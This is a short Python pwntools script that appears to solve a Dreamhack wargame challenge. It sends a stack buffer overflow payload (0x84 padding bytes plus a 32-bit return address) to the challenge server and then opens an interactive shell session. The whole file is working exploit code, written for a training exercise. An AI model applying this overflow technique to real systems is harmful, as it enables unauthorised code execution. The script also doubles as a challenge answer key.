from pwn import *

p=remote("host3.dreamhack.games", 23796)

payload=b"A"*0x84

payload+=p32(0x80485b9)

p.sendline(payload)
p.interactive()
